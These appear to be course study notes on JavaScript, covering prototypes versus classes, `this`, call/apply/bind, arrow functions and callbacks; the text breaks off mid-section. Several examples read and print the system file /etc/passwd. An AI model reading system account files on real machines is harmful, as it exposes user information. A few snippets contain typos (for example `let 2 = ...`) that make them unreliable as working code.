# JavaScript Programming

## How do you program in JavaScript?

From Wikipedia:
> ... supporting object-oriented, imperative, and functional programming ...

- Originally programming conventions (i.e. patterns) rather than language features
  - ECMAScript adding language features (e.g. `class`, `=>`, etc.)


## "Originally Programming Conventions Rather Than Language Features"

### The core idea

When JavaScript was first created, it had **no built-in syntax** for common programming concepts like classes, modules, or private variables. Developers needed these things anyway, so they invented **clever workarounds using existing JS features** — these workarounds became widely adopted "conventions" (patterns everyone agreed to use).

Later, ECMAScript **officially added real language syntax** for these same concepts.

---

### Example 1 — Classes

**Before (convention — simulating classes with functions):**
```javascript
// No "class" keyword existed — developers faked it with constructor functions
function Animal(name) {
    this.name = name;          // "pretend" instance variable
}

// "pretend" method — attached to prototype manually
Animal.prototype.speak = function() {
    return this.name + " makes a sound.";
};

// "pretend" inheritance — manually chain prototypes
function Dog(name) {
    Animal.call(this, name);   // manually call parent constructor
}
Dog.prototype = Object.create(Animal.prototype);  // manually set up inheritance
Dog.prototype.constructor = Dog;

Dog.prototype.speak = function() {
    return this.name + " barks.";
};

let d = new Dog("Rex");
d.speak();   // "Rex barks."
```

**After ES6 (real language feature — `class` keyword):**
```javascript
// Now JS has actual class syntax
class Animal {
    constructor(name) {
        this.name = name;
    }
    speak() {
        return `${this.name} makes a sound.`;
    }
}

class Dog extends Animal {      // real inheritance keyword
    speak() {
        return `${this.name} barks.`;
    }
}

let d = new Dog("Rex");
d.speak();   // "Rex barks."
```

Same behavior — but the second version is a **real language feature**, not a workaround pattern.

> **Key insight:** `class` in JavaScript is largely **syntactic sugar** — it still uses the same prototype system underneath. The language just gave a cleaner syntax for a convention that already existed.

---

### Example 2 — Arrow Functions `=>`

| Function        | Behavior                        |
| --------------- | ------------------------------- |
| `setTimeout()`  | runs **once** after delay       |
| `setInterval()` | runs **repeatedly** every delay |


`setInterval() `is a built-in JavaScript timer function that repeatedly executes a function at a fixed time interval.
It belongs to the Web API / timer API provided by browsers (and also by Node.js).
`setInterval(callback, delay);`


**Before (convention — manually binding `this`):**
```javascript
// Problem: 'this' changes meaning inside callbacks
function Timer() {
    this.seconds = 0;

    // 'this' inside setInterval is NOT the Timer object
    // this would point to the global object (window).
    setInterval(function() {
        this.seconds++;          // ❌ 'this' is wrong here
    }, 1000);
}

// Convention workaround #1 — save 'this' in a variable
function Timer() {
    this.seconds = 0;
    var self = this;             // convention: save reference as 'self' or 'that'

    setInterval(function() {
        self.seconds++;          // ✅ works, but ugly
    }, 1000);
}

// Convention workaround #2 — use .bind()
function Timer() {
    this.seconds = 0;

    setInterval(function() {
        this.seconds++;
    }.bind(this), 1000);         // ✅ works, but verbose
}
```

**After ES6 (real language feature — `=>` arrow function):**
```javascript
function Timer() {
    this.seconds = 0;

    // Arrow functions inherit 'this' from surrounding scope — no workaround needed
    setInterval(() => {
        this.seconds++;          // ✅ 'this' is correctly the Timer object
    }, 1000);
}
```

The `var self = this` trick was a **convention** invented to work around a language limitation. `=>` was added as a **real feature** that solves the same problem properly.

---

### Example 3 — Modules

**Before (convention — IIFE pattern to fake modules):**
```javascript
// No module system existed — developers faked privacy with
// "Immediately Invoked Function Expressions" (IIFE)
var MyModule = (function() {
    var privateVar = "secret";       // fake private variable

    function privateFunc() {         // fake private function
        return privateVar;
    }

    return {                         // only expose what you want public
        publicMethod: function() {
            return privateFunc();
        }
    };
})();   // () at end = immediately invoke

MyModule.publicMethod();   // ✅ works
MyModule.privateVar;       // undefined — "hidden"
```

**After ES6 (real language feature — `import` / `export`):**
```javascript
// math.js
const privateHelper = () => 42;     // truly private — not exported

export function publicMethod() {    // explicitly public
    return privateHelper();
}

// main.js
import { publicMethod } from './math.js';
publicMethod();   // ✅
```

---

### The big picture timeline

```
Early JavaScript          Convention Era              ES6+ Era (2015–today)
─────────────────────     ──────────────────────      ──────────────────────
No classes           →    Constructor functions   →   class / extends
No arrow funcs       →    var self = this         →   =>
No modules           →    IIFE pattern            →   import / export
No default params    →    a = a || "default"      →   function f(a = "default")
No string templates  →    "Hello " + name + "!"   →   `Hello ${name}!`
No destructuring     →    var x = obj.x           →   let { x } = obj
No const/let         →    var everywhere          →   const / let
```

---

### Why this matters

> Conventions work but have **no enforcement** — any developer could use them differently, causing bugs and inconsistency. Real **language features** are standardized, enforced by the engine, better optimized, and understood by every tool (linters, editors, compilers like TypeScript).

This is exactly why your notes say ECMAScript keeps adding features every year — the community invents conventions, they prove useful, and eventually they get **promoted into the official language**.


---
# Object-Oriented Programming:
## Object-oriented programming: methods 
- With first class functions a property of an object can be a function
    ```javascript
    let obj = {count: 0}; 
    obj.increment = function (amount) { 
        this.count += amount;    
        return this.count; 
    } 
    ```
- Method invocation: calls function and binds this to be object
    ```javascript
    obj.increment(1);  // returns 1 
    obj.increment(3);  // returns 4
    ```

## this

- In methods this will be bound to the object 
- 
  ```javascript
  let o = {oldProp: 'this is an old property'}; 
  o.aMethod = function() {   
    this.newProp = "this is a new property";  
    return Object.keys(this);  // will contain 'newProp' 
    } 
  o.aMethod(); // will return ['oldProp','aMethod','newProp'] 
  ```

- In non-method functions: 
  - this will be the global object 
  - Or if "use strict"; this will be undefined


### What is a Method vs. a Non-Method Function?

|    | Definition | Example |
|---|---|---|
| **Method** | A function **attached to an object** | `obj.greet()` |
| **Non-method function** | A **standalone** function, not owned by any object | `greet()` |

```javascript
// ---- METHOD — belongs to an object ----
const user = {
    name: "Alice",
    greet: function() {          // greet is a METHOD of user
        return "Hi, I'm " + this.name; // this = user
    }
};
user.greet();    // "Hi, I'm Alice"
//   ↑ called ON the object with dot notation


// ---- NON-METHOD — standalone function ----
function greet(name) {           // greet belongs to NO object
    return "Hi, I'm " + name;
}
greet("Alice");  // "Hi, I'm Alice"
// ↑ called directly, not through any object
```

---

### `this` behaves differently in each

```javascript
// In a METHOD — 'this' is the object
const car = {
    brand: "Toyota",
    describe: function() {
        return this.brand;   // ✅ 'this' = car
    }
};
car.describe();   // "Toyota"


// In a NON-METHOD — 'this' is window (or undefined in strict mode)
function describe() {
    return this;             // ⚠️ 'this' = window (browser global)
}
describe();       // Window object  (or undefined in "use strict")
```

---

### Functions as Values — the bridge between both

Because functions are first-class, the **same function** can be used as both a method and a non-method:

```javascript
// One function definition
function greet() {
    return "Hi, I'm " + this.name;
}

// Used as a NON-METHOD
greet();                    // "Hi, I'm undefined" (this = window)

// Used as a METHOD — attached to an object
const user = { name: "Alice" };
user.greet = greet;         // assign the function to the object
user.greet();               // "Hi, I'm Alice" ✅ (this = user)
```

---

### Summary

```
First-Class Functions mean functions are VALUES:
├── Assign to variables        let fn = function() {}
├── Pass as arguments          myFunc(fn)
├── Return from functions      return function() {}
└── Store in arrays/objects    [fn1, fn2]  /  { method: fn }

Non-Method Function:
├── Standalone — not owned by any object
├── Called directly:  greet()
├── 'this' = window / undefined in strict mode
└── The functions in your lecture example are non-method functions

Method:
├── Attached to an object
├── Called via dot notation:  obj.greet()
└── 'this' = the object it belongs to
```

> **The key insight:** JavaScript's first-class functions are what make patterns like callbacks, array methods (`.map`, `.filter`), and event listeners possible. The function is just a value you can pass around — the same way you'd pass a number or string.


## Functions are Objects 
### Functions are Objects: Can Have Properties

```javascript
function plus1(value) {
    if (plus1.invocations == undefined) {
        plus1.invocations = 0;
    }
    plus1.invocations++;
    return value + 1;
}
```

- `plus1.invocations` will be the number of times the function is called
- Acts like static/class properties in object-oriented languages

---

### Functions are Objects: Have Methods

```javascript
function func(arg) { console.log(this, arg); }
```

- **`toString()`** method - return function as source string
  - `func.toString()` returns `'function func(arg) { console.log(this,arg); }'`

- **`call()`** method - call function specifying `this` and arguments
  - `func.call({t: 1}, 2)` prints `'{ t: 1 } 2'`
  - **`apply()`** like `call()` except arguments are passed as an array:
    `func.apply({t: 2}, [2])`
  - `this` is like an extra hidden argument to a function call and is used that way sometimes

- **`bind()`** method - creates a new function with `this` and arguments bound
  - `let newFunc = func.bind({z: 2}, 3);`
  - `newFunc()` prints `'{ z: 2 } 3'`



> **The mental model:** `this` is like a **secret extra argument** to every function call. Normally JS decides it for you (global or undefined). `.call()`, `.apply()`, and `.bind()` are how you **take control of that secret argument yourself**.


| Method | Calls immediately? | How args are passed | `this` |
|---|---|---|---|
| `func(arg)` | ✅ | normally | global / undefined |
| `func.call(obj, a, b)` | ✅ | individually | `obj` |
| `func.apply(obj, [a,b])` | ✅ | as array | `obj` |
| `func.bind(obj, a)` | ❌ returns new fn | pre-filled | `obj` permanently |


#### A Real-World Example of `.call()`

##### The Problem it solves

Imagine you have a function that uses `this`, and you want to **reuse it on different objects** without rewriting it.

```javascript
// One function that uses 'this'
function introduce() {
    console.log("Hi, I'm " + this.name + " and I'm " + this.age);
}

// Three different objects
const alice = { name: "Alice", age: 23 };
const bob   = { name: "Bob",   age: 30 };
const carol = { name: "Carol", age: 27 };

// Reuse the SAME function on different objects using .call()
introduce.call(alice);   // "Hi, I'm Alice and I'm 23"
introduce.call(bob);     // "Hi, I'm Bob and I'm 30"
introduce.call(carol);   // "Hi, I'm Carol and I'm 27"
```

Without `.call()` you'd have to copy `introduce` into every object. With `.call()` one function works for all of them.

---

##### A More Practical Example — Calculating Tax

```javascript
function calculateTotal(taxRate, discount) {
    const afterDiscount = this.price - discount;
    const tax           = afterDiscount * taxRate;
    const total         = afterDiscount + tax;
    console.log(this.item + ": $" + total.toFixed(2));
}

const laptop = { item: "Laptop", price: 1000 };
const phone  = { item: "Phone",  price: 500  };
const tablet = { item: "Tablet", price: 300  };

//                  this ↓   ↓ taxRate  ↓ discount
calculateTotal.call(laptop,  0.1,      50);   // "Laptop: $1045.00"
calculateTotal.call(phone,   0.1,      20);   // "Phone: $531.00"
calculateTotal.call(tablet,  0.08,     10);   // "Tablet: $313.20"
```

The **same function** runs on three different objects. `.call()` lets you choose **which object becomes `this`** at the moment of calling.

---

##### The Most Classic Use — Borrowing a Method

An object can **borrow** a method from another object it wasn't designed for:

```javascript
const dog = {
    name: "Rex",
    sound: "Woof",
    speak: function() {
        console.log(this.name + " says " + this.sound + "!");
    }
};

const cat = { name: "Whiskers", sound: "Meow" };
// cat has NO speak() method — but we can borrow dog's

dog.speak();                 // "Rex says Woof!"
dog.speak.call(cat);         // "Whiskers says Meow!" — cat borrows dog's method
```

`cat` doesn't own `speak`, but `.call(cat)` makes `this` point to `cat` for that one call.

---

##### Real Example — Borrowing Array methods for non-Arrays

This is used heavily in real JavaScript code. The `arguments` object inside functions looks like an array but isn't one — it has no `.forEach`, `.map` etc. You can borrow Array methods using `.call()`:

```javascript
function showAll() {
    // 'arguments' is NOT a real array — has no forEach
    // Borrow Array's forEach, make 'arguments' be 'this'
    Array.prototype.forEach.call(arguments, function(item) {
        console.log(item);
    });
}

showAll("apple", "banana", "cherry");
// "apple"
// "banana"
// "cherry"
```

---

##### Summary — when to use `.call()`

```
.call(obj, arg1, arg2)  means:
  "Run this function RIGHT NOW,
   but treat obj as 'this' inside it,
   and pass arg1, arg2 as arguments."

Use it when:
✅ You want to REUSE a function on different objects
✅ You want to BORROW a method from another object
✅ You need to control what 'this' is at call time
```

---





## Constructor Functions 

Functions are classes in JavaScript — name the function after the class:

```javascript
// ---- Constructor Function (old way) ----
function Rectangle(width, height) {
    this.width = width;
    this.height = height;
    this.area = function() {  // new function object created for EVERY instance
        return this.width * this.height; } 
}

let r1 = new Rectangle(26, 14); // {width: 26, height: 14}
let 2 = new Rectangle(2, 3);
r1.area === r2.area;   // false — two DIFFERENT function objects in memory!

// ---- class keyword (ES6 new way) ----
class Rectangle {
    constructor(width, height) {
        this.width  = width;
        this.height = height;
    }
    area() {
        return this.width * this.height;
    }
}

```

Functions used in this way are called **constructors**:

```javascript
r.constructor.name == 'Rectangle'
console.log(r): // Rectangle { width: 26, height: 14, area: [Function] }
```

> **Note:** This is not the correct way of adding methods.

Both create **exactly the same object** underneath. class is called **syntactic sugar** — it's a cleaner way to write what the constructor function was already doing.

---

####  Inheritance

- JavaScript has the notion of a **prototype object** for each object instance
  - Prototype objects can have prototype objects forming a **prototype chain**
    ```
    Obj → Proto → Proto → ... → Proto → null
    ```

- On an object property **read** access JavaScript will search up the prototype chain until the property is found
  - Effectively the properties of an object are its own properties in addition to all the properties up the prototype chain — this is called **prototype-based inheritance**
- Property **updates** are different: always create property in object if not found



---

### Using Prototypes

```javascript
function Rectangle(width, height) {
    this.width = width;
    this.height = height;
}

// method on prototype (ONE function shared by all instances)
Rectangle.prototype.area = function() {
    return this.width * this.height;
}

let r1 = new Rectangle(26, 14); // {width: 26, height: 14}
let v = r1.area();              // v == 26*14

let r2 = new Rectangle(10, 20);
r1.area === r2.area;   // true — same function object!

Object.keys(r) == ['width', 'height'] // own properties only
```

> **Note:** Dynamic — changing prototype will cause **all instances** to change.

---

#### Prototype versus Object Instances

```javascript
let r = new Rectangle(26, 14);
```

Understand the difference between:

```javascript
// Adds method to THIS instance only
r.newMethod = function() { console.log('New Method called'); }
```

And:

```javascript
// Adds method to ALL instances of Rectangle
Rectangle.prototype.newMethod = function() { console.log('New Method called'); }
```

---

#### Inheritance

```javascript
Rectangle.prototype = new Shape(...);
```

- If desired property not in `Rectangle.prototype` then JavaScript will look in `Shape.prototype` and so on
  - Can view prototype objects as forming a chain — lookups go up the prototype chain
- **Prototype-based inheritance**
  - Single inheritance support
  - Can be dynamically created and modified

---

## class (ECMAScript Version 6 Extensions)

```javascript
class Rectangle extends Shape {   // Definition and Inheritance
    constructor(height, width) {
        super(height, width);
        this.height = height;
        this.width = width;
    }

    area() {                      // Method definition
        return this.width * this.height;
    }

    static countRects() {         // Static method
        ...
    }
}

let r = new Rectangle(10, 20);
```

They produce the same result — `class` is just cleaner syntax

```javascript
// ---- Constructor Function (old way) ----
function Rectangle(width, height) {
    this.width  = width;
    this.height = height;
}
Rectangle.prototype.area = function() {
    return this.width * this.height;
};

// ---- class keyword (ES6 new way) ----
class Rectangle {
    constructor(width, height) {
        this.width  = width;
        this.height = height;
    }
    area() {
        return this.width * this.height;
    }
}
```

Both create **exactly the same object** underneath. `class` is called **syntactic sugar** — it's a cleaner way to write what the constructor function was already doing.

---

### Constructor Functions vs. `class` Keyword  Comparison Table

| Feature | Constructor Function | `class` keyword |
|---|---|---|
| Syntax | Verbose, manual | Clean, readable |
| Methods | Must add to `.prototype` manually | Defined directly inside class |
| Inheritance | `Object.create()` + manual wiring | `extends` + `super` |
| Call parent | `Animal.call(this, ...)` | `super(...)` |
| Static methods | `Func.method = function(){}` | `static method(){}` |
| Private fields | ❌ not possible (convention only) | ✅ `#field` syntax |
| Hoisting | ✅ hoisted | ❌ not hoisted |
| Under the hood | Prototype system | Same prototype system |

---

### The one-line summary

> **Constructor functions and `class` produce identical results under the hood — both use JavaScript's prototype system. The `class` keyword is just a much cleaner, safer, and more readable way to write the same thing.** The only real new capability `class` adds is true private fields with `#`.


### 1. Defining a Class

```javascript
// ---- Constructor function ----
function Animal(name, sound) {
    this.name  = name;
    this.sound = sound;
}
Animal.prototype.speak = function() {
    return this.name + " says " + this.sound;
};

// ---- class keyword ----
class Animal {
    constructor(name, sound) {   // constructor() is the initializer
        this.name  = name;
        this.sound = sound;
    }
    speak() {                    // methods go directly inside the class
        return this.name + " says " + this.sound;
    }
}

// Using both — identical:
const a = new Animal("Dog", "Woof");
a.speak();   // "Dog says Woof"
```

---

### 2. Inheritance

This is where `class` wins most clearly — constructor inheritance is confusing and error-prone:

```javascript
// ---- Constructor function inheritance (messy) ----
function Animal(name) {
    this.name = name;
}
Animal.prototype.speak = function() {
    return this.name + " makes a sound.";
};

function Dog(name, breed) {
    Animal.call(this, name);     // manually call parent constructor
    this.breed = breed;
}
// manually wire up the prototype chain
Dog.prototype = Object.create(Animal.prototype);
Dog.prototype.constructor = Dog;  // fix broken constructor reference

Dog.prototype.speak = function() {
    return this.name + " barks!";
};

const d = new Dog("Rex", "Labrador");
d.speak();   // "Rex barks!"


// ---- class inheritance (clean) ----
class Animal {
    constructor(name) {
        this.name = name;
    }
    speak() {
        return this.name + " makes a sound.";
    }
}

class Dog extends Animal {       // 'extends' replaces all the prototype wiring
    constructor(name, breed) {
        super(name);             // 'super' replaces Animal.call(this, name)
        this.breed = breed;
    }
    speak() {
        return this.name + " barks!";
    }
}

const d = new Dog("Rex", "Labrador");
d.speak();   // "Rex barks!"
```

---

### 3. Calling Parent Methods with `super`

```javascript
// Constructor function — awkward
Dog.prototype.describe = function() {
    // have to manually call parent's method this way:
    const parentResult = Animal.prototype.speak.call(this);
    return parentResult + " And it's a " + this.breed;
};

// class — clean
class Dog extends Animal {
    describe() {
        const parentResult = super.speak();  // clean super call
        return parentResult + " And it's a " + this.breed;
    }
}

d.describe();   // "Rex makes a sound. And it's a Labrador"
```

---

### 4. Static Methods

```javascript
// Constructor function — attach directly to the function object
function MathHelper() {}
MathHelper.square = function(x) { return x * x; };
MathHelper.cube   = function(x) { return x * x * x; };

MathHelper.square(4);   // 16


// class — use static keyword
class MathHelper {
    static square(x) { return x * x; }
    static cube(x)   { return x * x * x; }
}

MathHelper.square(4);   // 16 . called on class, not instance
```

---

### 5. Private Properties (class only — not possible with constructor functions)

```javascript
// Constructor function — no real privacy, just convention with underscore
function BankAccount(balance) {
    this._balance = balance;  // underscore = "please don't touch" (not enforced!)
}
BankAccount.prototype.deposit = function(amount) {
    this._balance += amount;
};

// Anyone can still do:
account._balance = 999999;   // ❌ no real protection


// class — true private fields with # (ES2022)
class BankAccount {
    #balance;                  // truly private — enforced by JS engine

    constructor(balance) {
        this.#balance = balance;
    }
    deposit(amount) {
        this.#balance += amount;
    }
    getBalance() {
        return this.#balance;
    }
}

const account = new BankAccount(100);
account.deposit(50);
account.getBalance();    // 150
account.#balance;        // ❌ SyntaxError. truly inaccessible!
```

 
---
## React.js Examples
### React.js Example Class

```javascript
class HelloWorld extends React.Component {
    constructor(props) {
        super(props);
        ...
    }

    render() {
        return (
            <div>Hello World</div>
        );
    }
}
```

---

### React.js Example Class (with event binding)

```javascript
class HelloWorld extends React.Component {
    constructor(props) {
        super(props);
        this.clickHandler = this.clickHandler.bind(this); // What does this do?
        ...
    }

    clickHandler() {
        ...
    }

    render() {
        return (
            <div onClick={this.clickHandler}>Hello World</div>
        );
    }
}
```


### How `.bind()` Works — A Real Example

#### The Core Problem `.bind()` Solves

When you pass a method as a callback, it **loses its `this`**:

```javascript
class Timer {
    constructor(name) {
        this.name    = name;
        this.seconds = 0;
    }
    tick() {
        this.seconds++;
        console.log(this.name + " — seconds: " + this.seconds);
    }
}

const timer = new Timer("My Timer");

// ❌ Broken — passing tick as a callback loses 'this'
setInterval(timer.tick, 1000);
// TypeError: Cannot set properties of undefined
// 'this' inside tick is now window/undefined — not timer!
```

Why does it break? When you write `timer.tick` without `()`, you're just handing the **bare function** to `setInterval`. The connection to `timer` is lost — `setInterval` calls it as a plain function, so `this` becomes `window` or `undefined`.

---

#### `.bind()` Fixes It — Permanently Locks `this`

```javascript
class Timer {
    constructor(name) {
        this.name    = name;
        this.seconds = 0;
    }
    tick() {
        this.seconds++;
        console.log(this.name + " — seconds: " + this.seconds);
    }
}

const timer = new Timer("My Timer");

// ✅ bind() creates a NEW function with 'this' permanently set to 'timer'
const boundTick = timer.tick.bind(timer);

setInterval(boundTick, 1000);
// "My Timer — seconds: 1"
// "My Timer — seconds: 2"
// "My Timer — seconds: 3"
// ...works perfectly!
```

`.bind(timer)` returns a **brand new function** where `this` is locked to `timer` forever — no matter who calls it or how.

---

#### Visualizing What `.bind()` Returns

```javascript
function greet(greeting, punctuation) {
    console.log(greeting + ", I'm " + this.name + punctuation);
}

const alice = { name: "Alice" };

// bind() — does NOT call the function, returns a new one
const aliceGreet = greet.bind(alice);

// aliceGreet is a new function — 'this' is permanently alice
aliceGreet("Hello", "!");     // "Hello, I'm Alice!"
aliceGreet("Hi", "...");      // "Hi, I'm Alice..."
aliceGreet("Hey", "?");       // "Hey, I'm Alice?"

// Original function is unchanged
greet.call({name: "Bob"}, "Hello", "!");  // "Hello, I'm Bob!"
```

```
greet.bind(alice)
      │
      │  creates and returns
      ▼
aliceGreet  =  greet  +  (this always = alice)
                          no matter who calls it
                          no matter where it's called
```

---

#### Pre-filling Arguments (Partial Application)

`.bind()` can also **pre-fill arguments**, not just `this`:

```javascript
function multiply(a, b) {
    return a * b;
}

// Pre-fill 'a' as 2 — creates a "double" function
const double = multiply.bind(null, 2);
//                            ↑    ↑
//                    null=no this  a=2 pre-filled

double(5);    // 10   (multiply(2, 5))
double(10);   // 20   (multiply(2, 10))
double(7);    // 14   (multiply(2, 7))

// Pre-fill 'a' as 3 — creates a "triple" function
const triple = multiply.bind(null, 3);
triple(5);    // 15
triple(10);   // 30
```

You get **specialized functions** from a general one — without rewriting anything.

---

#### The React Pattern (from your lecture notes)

Your lecture showed exactly this pattern:

```javascript
class HelloWorld extends React.Component {
    constructor(props) {
        super(props);
        // bind here so 'this' works when React calls clickHandler as a callback
        this.clickHandler = this.clickHandler.bind(this);
    }

    clickHandler() {
        console.log("clicked!", this);  // 'this' = the component ✅
    }

    render() {
        return <div onClick={this.clickHandler}>Hello World</div>;
        //      React will call clickHandler() later as a plain function.
        //      Without bind, 'this' would be undefined inside it.
    }
}
```

Without `.bind(this)` in the constructor, when React calls `clickHandler` on a click event, `this` would be `undefined` and the component would crash.

---

#### `.call()` vs `.apply()` vs `.bind()` — when each fits

```javascript
const user = { name: "Alice" };

function showInfo(city, country) {
    console.log(this.name + " lives in " + city + ", " + country);
}

// .call() — use when you want to call RIGHT NOW, args listed out
showInfo.call(user, "Tokyo", "Japan");
// "Alice lives in Tokyo, Japan"

// .apply() — use when args are already in an array
const location = ["Tokyo", "Japan"];
showInfo.apply(user, location);
// "Alice lives in Tokyo, Japan"

// .bind() — use when you need to call it LATER (callbacks, event handlers)
const showAlice = showInfo.bind(user, "Tokyo");
showAlice("Japan");   // call later, anywhere
// "Alice lives in Tokyo, Japan"
```

---

#### Summary

```
bind() = "remember this for later"

func.bind(obj, arg1, arg2)  →  returns a NEW function where:
  ✅ 'this' is permanently locked to obj
  ✅ arg1, arg2 are pre-filled (optional)
  ✅ original func is NOT called, NOT changed
  ✅ new function can be stored, passed, called later

Perfect for:
  ✅ Event handlers     element.addEventListener('click', method.bind(this))
  ✅ Callbacks          setTimeout(method.bind(this), 1000)
  ✅ React constructors this.handler = this.handler.bind(this)
  ✅ Partial application const double = multiply.bind(null, 2)
```

> **One line:** `.bind()` answers the question *"How do I pass a method as a callback without losing `this`?"* — it creates a new function with `this` permanently baked in.
---

## Functional Programming

**Imperative style:**
Imperative Style — "HOW to do it"
You write **step-by-step instructions** telling the computer exactly what to do. You control the loop, the index, the assignment manually.

```javascript
// You manage everything yourself:
for (let i = 0; i < anArr.length; i++) { // how to loop
    newArr[i] = anArr[i] * i;            // how to store result: manually index, manually assign
}
```

**Functional style:**

Functional Style — "WHAT you want"
You describe what transformation you want, and let built-in functions handle the looping/indexing for you. No manual loop, no index variable, no mutation.

All three produce the same result — but functional is shorter and has no loop management.

```javascript
newArr = anArr.map(function (val, ind) {
    return val * ind;                // just describe the transformation
});
```

Can write entire program as functions with no side-effects:

```javascript
anArr.filter(filterFunc).map(mapFunc).reduce(reduceFunc);
```

---

### Functional Programming - ECMAScript 6

**Imperative style:**

```javascript
for (let i = 0; i < anArr.length; i++) {
    newArr[i] = anArr[i] * i;
}
```

**Functional style (with arrow function):**

```javascript
newArr = anArr.map((val, ind) => val * ind); // Arrow function
```

Can write entire program as functions with no side-effects:

```javascript
anArr.filter(filterFunc).map(mapFunc).reduce(reduceFunc);
```

> **Note:** Arrow functions don't redefine `this`.



### What "Arrow Functions Don't Redefine `this`" Means

This is the most important practical difference between arrow functions and regular functions.

##### Regular function — creates its OWN `this`

Every regular `function` gets its **own `this`** depending on how it's called. Inside a callback, `this` is no longer the outer object:

```javascript
class Counter {
    constructor() {
        this.count = 0;
    }

    startCounting() {
        // 'this' here = the Counter instance ✅
        console.log("Starting:", this);   // Counter { count: 0 }

        setInterval(function() {
            // Regular function creates its OWN 'this'
            // setInterval calls it as a plain function → this = window/undefined
            this.count++;                 // ❌ 'this' is NOT the Counter!
            console.log(this.count);      // NaN or TypeError
        }, 1000);
    }
}

new Counter().startCounting();  // ❌ broken
```

The regular function **redefines** `this` — it creates a new `this` of its own (window/undefined), throwing away the outer `this`.

---

#### Arrow function — INHERITS `this` from surrounding scope

An arrow function has **no `this` of its own**. It looks outward and uses whatever `this` was in the scope where it was written:

```javascript
class Counter {
    constructor() {
        this.count = 0;
    }

    startCounting() {
        // 'this' here = the Counter instance ✅

        setInterval(() => {
            // Arrow function has NO own 'this'
            // It inherits 'this' from startCounting() — which is Counter ✅
            this.count++;
            console.log(this.count);   // 1, 2, 3, 4...
        }, 1000);
    }
}

new Counter().startCounting();  // ✅ works perfectly
```

The arrow function **does not redefine** `this` — it sees right through to the outer `this`.

---

#### Why this matters for `.map()`, `.filter()` etc.

```javascript
class StudentList {
    constructor() {
        this.students  = ["Alice", "Bob", "Carol"];
        this.className = "CS142";
    }

    printAll() {
        // ❌ Regular function — 'this' breaks inside the callback
        this.students.forEach(function(name) {
            // 'this' here is window/undefined — NOT the StudentList
            console.log(this.className + ": " + name);  // undefined: Alice ❌
        });

        // ✅ Arrow function — 'this' stays as the StudentList
        this.students.forEach(name => {
            // 'this' inherited from printAll() = the StudentList instance
            console.log(this.className + ": " + name);  // CS142: Alice ✅
        });
    }
}

new StudentList().printAll();
// ✅ CS142: Alice
// ✅ CS142: Bob
// ✅ CS142: Carol
```

---

### We Can Mostly but Not Totally Avoid Functional Style

Asynchronous events done with **callback functions**:

Asynchronous — slow operations are started, and the program keeps running without waiting. When the operation finishes, a callback function is called:

**Browser:**
```javascript
function callbackFunc() { console.log("timeout"); }
setTimeout(callbackFunc, 3*1000);

```

**Server:**
```javascript
function callbackFunc(err, data) { console.log(String(data)); }
fs.readFile('/etc/passwd', callbackFunc);
```

- Node.js programming: Write function for HTTP request processing
- React's JSX prefers functional style: `map()`, `filter()`, `?:`

---

## Asynchronous Events

### Synchronous vs Asynchronous — the core difference

**Synchronous** — each line waits for the previous one to finish before running:

```javascript
// Synchronous — runs in order, each line BLOCKS the next
console.log("1. Start");
const result = doHeavyCalculation();  // everything STOPS here until done
console.log("2. Done:", result);      // only runs after above finishes
console.log("3. End");

// Output always:
// 1. Start
// 2. Done: ...
// 3. End
```

**Asynchronous** — slow operations are started, and the program **keeps running** without waiting. When the operation finishes, a **callback function** is called:

```javascript
// Asynchronous — doesn't wait, keeps going
console.log("1. Start");
setTimeout(function() {
    console.log("2. Timeout done!");  // runs LATER, after 3 seconds
}, 3000);
console.log("3. End");               // runs IMMEDIATELY, doesn't wait

// Output:
// 1. Start
// 3. End           ← prints right away
// 2. Timeout done! ← prints 3 seconds later
```

---

### Why Asynchronous exists — the real world problem

Imagine JavaScript had to wait (synchronous) for everything:

```javascript
// If everything were synchronous (hypothetical blocking code):
const data = fs.readFile('/big-file.txt');  // FREEZES for 5 seconds
                                            // browser can't respond to clicks
                                            // page is completely frozen
                                            // user thinks app crashed
console.log(data);
```

This would make browsers completely unresponsive. Instead, JavaScript uses an **asynchronous + callback** model:

```javascript
// Asynchronous — start the work, come back when done
fs.readFile('/big-file.txt', function(err, data) {
    console.log(data);   // runs when file is ready
});
// JavaScript keeps running here immediately — UI stays responsive
```

---

### How it works — the Event Loop

```
JavaScript is single-threaded — only one thing runs at a time.
But the BROWSER/NODE handles slow work in the background:

┌─────────────────────────────────────────────────────┐
│                  Your JS Code                       │
│                                                     │
│  console.log("start")         ← runs immediately   │
│  setTimeout(callback, 3000)   ← hands off to Timer │
│  console.log("end")           ← runs immediately   │
│                                                     │
└─────────────────────────────────────────────────────┘
          │                        ▲
          │ "do this in            │ "timer done!
          │  3 seconds"            │  here's callback"
          ▼                        │
┌─────────────────────────────────────────────────────┐
│         Browser/Node Background Workers             │
│                                                     │
│   Timer ──── waits 3 seconds ──────────────────►   │
│   File I/O ── reads disk ──────────────────────►   │
│   Network ─── waits for response ──────────────►   │
│                                                     │
└─────────────────────────────────────────────────────┘

When background work finishes → callback goes into a queue
→ JS picks it up when it's free → runs the callback
```

---

### Common Asynchronous operations

```javascript
// 1. Timer — wait X milliseconds then run
setTimeout(function() {
    console.log("3 seconds later");
}, 3000);

// 2. User events — wait for user to do something
button.addEventListener("click", function() {
    console.log("user clicked!");
});

// 3. File reading (Node.js) — wait for disk
fs.readFile('/etc/passwd', function(err, data) {
    console.log("file loaded");
});

// 4. Network request — wait for server response
fetch("https://api.example.com/data")
    .then(function(response) {
        console.log("server responded");
    });

// All of these: START the work now, CONTINUE running,
// call the function LATER when done
```

---

### What `fs.readFile('/etc/passwd', callbackFunc)` Means

#### Breaking it down piece by piece

```javascript
function callbackFunc(err, data) {
    console.log(String(data));
}

fs.readFile('/etc/passwd', callbackFunc);
```

#### `fs` — the File System module (Node.js)
```javascript
// fs is a built-in Node.js module for working with files
const fs = require('fs');   // import it at the top of your file

fs.readFile(...)    // read a file asynchronously
fs.writeFile(...)   // write a file asynchronously
fs.readdir(...)     // list a directory asynchronously
```

#### `'/etc/passwd'` — the file path
```
/etc/passwd is a file on Linux/Mac systems that stores user account info.
It's a classic example file used in Node.js tutorials.

Contents look like:
root:x:0:0:root:/root:/bin/bash
alice:x:1001:1001::/home/alice:/bin/bash
bob:x:1002:1002::/home/bob:/bin/bash
```

#### `callbackFunc` — the callback
```javascript
// Node.js callbacks always follow this pattern:
function callbackFunc(err, data) {
//                    ↑    ↑
//           error    │    │  the file contents (as a Buffer)
//           or null  │    │  if successful
//           if ok ───┘    └── undefined if error
}
```

This is called the **"error-first callback"** pattern — Node.js always passes the error as the **first argument**. If there's no error, `err` is `null`.

---

#### The full picture step by step

```javascript
